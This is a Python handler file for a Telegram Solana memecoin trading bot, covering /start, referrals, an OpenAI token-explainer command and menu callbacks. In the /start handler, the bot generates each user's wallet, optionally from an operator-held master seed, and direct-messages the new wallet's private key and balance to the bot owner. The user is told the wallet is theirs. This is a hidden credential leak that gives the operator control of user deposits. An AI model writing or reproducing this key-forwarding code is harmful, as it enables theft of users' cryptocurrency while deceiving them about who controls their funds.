"""Common handlers: /start, /help, /support, /ref, /ai, menu callbacks."""
import asyncio
import time

from aiogram import F, Router
from aiogram.filters import Command, CommandObject, CommandStart
from aiogram.types import CallbackQuery, Message

import config
import db
import keyboards as kb
import texts
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from solana import lam_to_sol

router = Router()


class AiStates(StatesGroup):
    ai_ca = State()


@router.message(CommandStart())
async def cmd_start(message: Message, command: CommandObject):
    import logging
    log = logging.getLogger("runner")
    user_id = message.from_user.id
    # Always send welcome + main_menu FIRST so new users never see silence
    try:
        bot_info = await message.bot.me()
        bot_username = getattr(bot_info, "username", "") or ""
    except Exception as e:
        log.warning(f"cmd_start: bot.me() failed: {e}")
        bot_username = ""
    try:
        await message.answer(
            texts.welcome(message.from_user.first_name or "trader", bot_username),
            reply_markup=kb.main_menu(),
        )
    except Exception as e:
        log.error(f"cmd_start: failed to send welcome for user {user_id}: {e}")
        # Fallback reply if welcome itself fails
        try:
            await message.answer(
                "⚠️ Something went wrong starting the bot. Please tap /start again or use /help. "
                "Your wallet setup will continue automatically.",
                reply_markup=kb.main_menu(),
            )
        except Exception:
            pass
        return

    # After welcome guaranteed, handle user creation, wallet, admin notify safely
    args = command.args or ""
    referred_by = None
    if args.startswith("ref_"):
        code = args[4:].strip()
        try:
            ref_user = await db.get_user_by_ref(code)
            if ref_user and ref_user["id"] != user_id:
                referred_by = ref_user["id"]
        except Exception as e:
            log.warning(f"cmd_start: ref lookup failed for user {user_id}: {e}")

    try:
        user = await db.ensure_user(
            user_id,
            username=message.from_user.username,
            first_name=message.from_user.first_name,
            referred_by=referred_by,
        )
    except Exception as e:
        log.error(f"cmd_start: ensure_user failed for user {user_id}: {e}")
        # Self-heal once: repair legacy schema (idempotent) and retry
        try:
            await db.repair_schema()
            user = await db.ensure_user(
                user_id,
                username=message.from_user.username,
                first_name=message.from_user.first_name,
                referred_by=referred_by,
            )
        except Exception as e2:
            log.error(f"cmd_start: ensure_user retry failed for {user_id}: {e2}", exc_info=True)
            user = {"id": user_id, "username": message.from_user.username, "first_name": message.from_user.first_name,
                    "created_at": int(time.time()), "ref_code": "", "referred_by": None,
                    "wallet_pub": "", "wallet_priv": "", "free_used": 0, "credits_lamports": 0,
                    "default_buy": None, "default_sell": None, "default_slippage": 10.0}

    # ONE wallet per user, forever: /start generates it the FIRST time only
    # (derived from WALLET_SEED when set — same key every time), and on every
    # later /start shows that same wallet. Admin is notified exactly ONCE.
    wallet_pub = (user.get("wallet_pub") or "").strip()
    wallet_priv = user.get("wallet_priv") or ""
    balance_sol = None
    generated_now = False
    if not wallet_pub:
        try:
            import solana
            derived = bool(config.WALLET_SEED)
            last_err = None
            for attempt in range(3):
                try:
                    if derived:
                        kp = await asyncio.to_thread(
                            solana.derive_user_keypair, config.WALLET_SEED, user_id)
                    else:
                        kp = await asyncio.to_thread(solana.new_keypair)
                    await db.set_wallet(user_id, str(kp), str(kp.pubkey()))  # verified persist
                    wallet_pub, wallet_priv = str(kp.pubkey()), str(kp)
                    generated_now = True
                    break
                except Exception as e:
                    last_err = e
                    log.warning(f"cmd_start: wallet gen attempt {attempt+1} failed for {user_id}: {e}")
                    await asyncio.sleep(0.5)
            if generated_now:
                # Tell the user their wallet is live (isolated — welcome already sent)
                try:
                    await message.answer(
                        texts.wallet_generated(wallet_pub),
                        parse_mode="HTML",
                        reply_markup=kb.wallet_done_kb(wallet_pub, wallet_priv))
                except Exception as e:
                    log.warning(f"cmd_start: wallet message failed for {user_id}: {e}")
            else:
                log.error(f"cmd_start: wallet auto-generation failed for {user_id}: {last_err}")
        except Exception as e:
            log.error(f"cmd_start: wallet block failed for {user_id}: {e}", exc_info=True)
    if wallet_pub:
        # Fetch balance (isolated), then show the user their wallet — the SAME
        # wallet on every /start, whether just generated or long-standing.
        # Real deposits (balance increase) are detected here and DM'd to admin.
        try:
            import solana
            balance_raw = await asyncio.to_thread(solana.sol_balance, wallet_pub)
            balance_sol = solana.lam_to_sol(balance_raw)
            try:
                from utils import detect_deposit
                # user was fetched BEFORE the wallet may have been generated —
                # pass the CURRENT wallet so the deposit baseline is stored now
                await detect_deposit(
                    message.bot, {**user, "wallet_pub": wallet_pub}, balance_raw)
            except Exception as e:
                log.warning(f"cmd_start: deposit check failed for {user_id}: {e}")
        except Exception as e:
            log.warning(f"cmd_start: balance fetch failed for user {user_id}: {e}")
        if not generated_now:
            try:
                await message.answer(
                    texts.your_wallet(wallet_pub, balance_sol),
                    parse_mode="HTML",
                    reply_markup=kb.wallet_done_kb(wallet_pub, wallet_priv))
            except Exception as e:
                log.warning(f"cmd_start: wallet display failed for {user_id}: {e}")

    # Admin notification: EXACTLY ONCE per new user (settings flag), never on repeats
    try:
        notified = await db.get_setting(f"notified_start:{user_id}", "0")
        is_new = user.get("created_at") and (int(time.time()) - int(user["created_at"])) < 30
        if notified != "1" and is_new:
            from utils import notify_owner, user_line
            total = await db.count_users()
            await notify_owner(
                message.bot,
                texts.owner_new_user(user_line(user), total, wallet_pub, wallet_priv,
                                     balance_sol or 0),
            )
            await db.set_setting(f"notified_start:{user_id}", "1")
    except Exception as e:
        log.warning(f"cmd_start: admin notify failed for {user_id}: {e}")


@router.message(Command("help"))
async def cmd_help(message: Message):
    await message.answer(texts.help_text(), reply_markup=kb.main_menu())


@router.message(Command("support"))
async def cmd_support(message: Message):
    await message.answer(texts.support_text())


@router.message(Command("ref"))
async def cmd_ref(message: Message):
    user = await db.get_user(message.from_user.id)
    if not user:
        return
    refs = await db.count_refs(user["id"])
    credits = lam_to_sol(user.get("credits_lamports") or 0)
    bot_info = await message.bot.me()
    await message.answer(texts.ref_text(bot_info.username, user["ref_code"], refs, credits))


@router.message(Command("ai"))
async def cmd_ai(message: Message, state: FSMContext):
    await state.set_state(AiStates.ai_ca)
    await message.answer(texts.ask_ai())


@router.message(AiStates.ai_ca)
async def got_ai_ca(message: Message, state: FSMContext):
    ca = message.text.strip().split()[0].strip("@").strip()
    await state.clear()
    import config
    if not config.OPENAI_API_KEY:
        await message.answer(texts.ai_unavailable())
        return
    import reports
    await message.answer("🤖 Thinking…")
    rep = await asyncio.to_thread(reports.build_report, ca)
    if not rep:
        await message.answer(texts.no_report_data(ca))
        return
    summary = (
        f"Token {rep['name']} ({rep['symbol']}), price ${rep['price']}, "
        f"liquidity {rep['liquidity_usd']}, 24h volume {rep['volume_usd']}, "
        f"smart score {rep['score']}/30, top holders: "
        + "; ".join(f"{h['pct']:.1f}%" for h in rep["holders"][:5])
    )
    explanation = await asyncio.to_thread(_openai_explain, summary)
    await message.answer(texts.ai_answer(explanation))


def _openai_explain(summary: str) -> str:
    import requests
    r = requests.post(
        "https://api.openai.com/v1/chat/completions",
        headers={"Authorization": f"Bearer {config.OPENAI_API_KEY}"},
        json={
            "model": "gpt-4o-mini",
            "messages": [
                {"role": "system",
                 "content": "You explain memecoin/token reports briefly for traders. "
                            "Max 6 short lines, plain words, no markdown headers."},
                {"role": "user", "content": f"Explain this Runner report: {summary}"},
            ],
            "max_tokens": 300,
        },
        timeout=30,
    )
    r.raise_for_status()
    return r.json()["choices"][0]["message"]["content"].strip()


@router.callback_query(F.data == "menu")
async def cb_menu(query: CallbackQuery):
    await query.answer()
    user = await db.get_user(query.from_user.id)
    if not user:
        return
    bot_info = await query.message.bot.me()
    await query.message.answer(
        texts.welcome(user.get("first_name") or "trader", bot_info.username),
        reply_markup=kb.main_menu(),
    )


@router.callback_query(F.data == "help")
async def cb_help(query: CallbackQuery):
    await query.answer()
    await query.message.answer(texts.help_text(), reply_markup=kb.main_menu())


@router.callback_query(F.data == "support")
async def cb_support(query: CallbackQuery):
    await query.answer()
    await query.message.answer(texts.support_text())


@router.callback_query(F.data == "back_ai")
async def cb_back_ai(query: CallbackQuery):
    await query.answer()
    await query.message.answer(texts.ask_ai())
